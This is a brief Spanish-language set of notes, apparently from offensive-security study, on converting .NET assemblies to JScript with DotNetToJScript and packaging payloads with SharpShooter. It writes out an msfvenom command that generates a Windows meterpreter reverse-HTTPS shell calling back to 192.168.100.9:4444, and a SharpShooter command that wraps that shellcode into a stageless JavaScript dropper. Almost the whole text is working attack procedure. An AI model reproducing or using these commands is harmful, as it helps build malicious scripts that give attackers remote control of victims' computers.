### C# a JScript
[https://github.com/tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript)

#### Proceso de ejecucion
ruta -> C:\<path>\DotNetToJScript\DotNetToJScript\bin\Release\  
DotNetToJScript.exe NDesk.Options.dll

ruta -> C:\<path>\DotNetToJScript\ExampleAssembly\bin\Release\  
 ExampleAssembly.dll
 
#### Compilacion
```
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o dmo.js
```

----

### SharpShooter
Uso de virtualEnv para la ejecucion
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.9 LPORT=4444 -f raw -o shell.txt
```

```
python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test
```


